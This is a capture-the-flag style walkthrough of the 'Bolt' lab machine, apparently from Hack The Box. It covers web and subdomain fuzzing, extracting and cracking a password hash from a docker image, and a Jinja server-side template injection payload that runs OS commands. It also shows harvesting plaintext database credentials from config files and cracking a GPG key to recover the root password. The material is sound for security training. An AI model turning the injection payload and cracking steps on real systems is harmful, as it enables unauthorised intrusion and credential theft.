## Bolt

### Lab Details 

- Difficulty: Medium
- Type: Web App, SSTI, Hash Cracking, GPG, Priv Esc, Linux

#### Enumeration
- run nmap
- run wfuzz on port 80
```bash
$ wfuzz -u http://10.129.114.163/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hw 474
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.114.163/FUZZ
Total requests: 17129

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000000061:   200        504 L    1801 W     30341 Ch    "index.html"                                                                                           
000000123:   200        467 L    1458 W     26291 Ch    "contact.html"                                                                                         
000000567:   500        4 L      40 W       290 Ch      "profile.html"                                                                                         
000000669:   200        345 L    1141 W     18568 Ch    "download.html"                                                                                        
000000937:   200        404 L    1419 W     22441 Ch    "services.html"                                                                                        
000002265:   200        548 L    2014 W     31723 Ch    "pricing.html"                                                                                         
000003377:   200        172 L    564 W      9287 Ch     "sign-in.html"                                                                                         
000005086:   200        198 L    639 W      11038 Ch    "sign-up.html"
```
- there is a `download.html` which we can go and download a docker image
- run feroxbuster on port 443 
![[domain name enum.png]]
- we get the domain name of the website hosted on port 443 (passbolt.bolt.htb)
- there is a login form that we can access 
![[passbolt home page.png]]
- continue with enumeration
```bash
$ wfuzz -u http://10.129.106.155 -H 'Host: FUZZ.bolt.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 1801
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.106.155/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000000002:   200        98 L     322 W      4943 Ch     "mail"                                                                                                 
000000038:   302        3 L      24 W       219 Ch      "demo"  
```
- checking the parent domain `bolt.htb` we get the `Admin LTE` web page
![[homepage for bolt.png]]
#### Initial Foothold 
- download and investigate the docker image `image.tar`
- we can use `dive` to investigate the image layer by layer
![[dive docker tar (mod files).png]]
- found this layer with modified files, exist db.sqlite3
```bash
$ sqlite3 db.sqlite3 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> 
sqlite> .databases
main: /home/ch4os1/Downloads/docker/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer/db.sqlite3 r/w
sqlite> .tables
User
sqlite> select * from User;
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
```
- crack the password with `hashcat`
```
$ hashcat hash --show                                      
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt 
```
- we can use the admin credential to login to `http://demo.bolt.htb/`
![[chat history on bolt.png]]
- in the chat history we find that there is additional info regarding email in the docker file
![[dive docker tar (routes).png]]
- in `41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py` we found the `invite_code`
```python
## from routes.py in layer id 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad
@blueprint.route('/register', methods=['GET', 'POST'])
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code	  = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
            # Check usename exists
            user = User.query.filter_by(username=username).first()
            if user:
                return render_template( 'accounts/register.html', 
                                    msg='Username already registered',
                                    success=False,
                                    form=create_account_form)

```
- we can use this `invite code` to register a new account at `http://demo.bolt.htb`
- in  `41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/home/routes.py` references template, which we can attempt a `SSTI` with `name`
```bash
@blueprint.route('/confirm/changes/<token>')
def confirm_changes(token):
    """Confirmation Token"""
    try:
        email = ts.loads(token, salt="changes-confirm-key", max_age=86400)
    except:
        abort(404)
    user = User.query.filter_by(username=email).first_or_404()
    name = user.profile_update
    template = open('templates/emails/update-name.html', 'r').read()
    msg = Message(
            recipients=[f'{user.email}'],
            sender = 'support@example.com',
            reply_to = 'support@example.com',
            subject = "Your profile changes have been confirmed."
        )
    msg.html = render_template_string(template % name)
    mail.send(msg)

    return render_template('index.html')
```
![[Medium/Unix/Bolt/SSTI.png]]
- RCE payload: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
![[Medium/Unix/Bolt/SSTI test.png]]
- we can inject a RCE with `SSTI`
#### Lateral Movement (If any)
- searching through different config files 
```
www-data@bolt:~/demo$ cat config.py
cat config.py
"""Flask Configuration"""
#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'kreepandcybergeek'
MAIL_SERVER = 'localhost'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
#MAIL_DEBUG = app.debug
MAIL_USERNAME = None
MAIL_PASSWORD = None
DEFAULT_MAIL_SENDER = 'support@bolt.htb'
```
- we find the login credential to `mysql`
```bash
$ cat $/etc/passbolt/passbolt.php
<snip>
    // Database configuration.
    'Datasources' => [
        'default' => [
            'host' => 'localhost',
            'port' => '3306',
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',
        ],
    ],
<snip>
```
- going through the database in `secrets` table there is a `PGP`key, save it for later
```
| 643a8b12-c42c-4507-8646-2f8712af88f8 | 4e184ee6-e436-47fb-91c9-dccb57f250bc | cd0270db-c83f-4f44-b7ac-76609b397746 | -----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R
zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp
edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u
l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt
oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7
FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov
8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey
5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY
NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a
Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
```
- list of installed mail applications
```bash
╔══════════╣ Searching installed mail applications
dovecot
maildirmake.dovecot
postfix
postfix-add-filter
postfix-add-policy
sendmail
```
- interesting log files
```bash
══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#logrotate-exploitation
logrotate 3.14.0

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes
Writable: /home/eddie/.local/share/xorg/Xorg.0.log
Writable: /home/eddie/.local/share/xorg/Xorg.0.log.old
Writable: /home/eddie/.local/share/gvfs-metadata/root-25f2da96.log
Writable: /home/eddie/.local/share/gvfs-metadata/home-22d70384.log
Writable: /home/eddie/.local/share/gvfs-metadata/uuid-2021-01-07-16-35-54-70-043200e7.log
Writable: /home/eddie/.config/google-chrome/Default/Site Characteristics Database/000003.log
Writable: /home/eddie/.config/google-chrome/Default/Sync Extension Settings/pkedcjkdefgpdelpbcmbmeomcjbeemfm/000003.log
Writable: /home/eddie/.config/google-chrome/Default/Platform Notifications/000003.log
Writable: /home/eddie/.config/google-chrome/Default/data_reduction_proxy_leveldb/000005.log
Writable: /home/eddie/.config/google-chrome/Default/Local Storage/leveldb/000003.log
Writable: /home/eddie/.config/google-chrome/Default/Extension Rules/000003.log
Writable: /home/eddie/.config/google-chrome/Default/Sync Data/LevelDB/000003.log
Writable: /home/eddie/.config/google-chrome/Default/shared_proto_db/metadata/000003.log
Writable: /home/eddie/.config/google-chrome/Default/shared_proto_db/000003.log
Writable: /home/eddie/.config/google-chrome/Default/Session Storage/000003.log
Writable: /home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log
<snip>
```
- `/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log` contains a `PGP` key for user `eddie`
- we can grep for the key
```
 grep "BEGIN PGP PRIVATE\|END PGP PRIVATE"
```
- we can crack it with `john`
```
john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt            
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
merrychristmas   (Eddie Johnson)     
1g 0:00:08:46 DONE (2025-09-02 08:37) 0.001897g/s 81.30p/s 81.30c/s 81.30C/s mhines..menudo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
#### Privilege Escalation
- attempt to decrypt the `PGP` key found in  `mysql` database earlier with  plaintext eddie's `PGP` key
``` bash
$ gpg -d root.pgp 
gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25
      "Eddie Johnson <eddie@bolt.htb>"
{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}gpg: Signature made Sat 06 Mar 2021 09:33:54 AM CST
gpg:                using RSA key 1C2741A3DC3B4ABD
gpg: Good signature from "Eddie Johnson <eddie@bolt.htb>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD
```
- we can change to `root` with the password
```hash
eddie@bolt:~$ su -
Password: 
root@bolt:~# whoami
root
```
#### Resources

#### Lesson Learned
- When found password spray across all available services
- Always look for Config Files 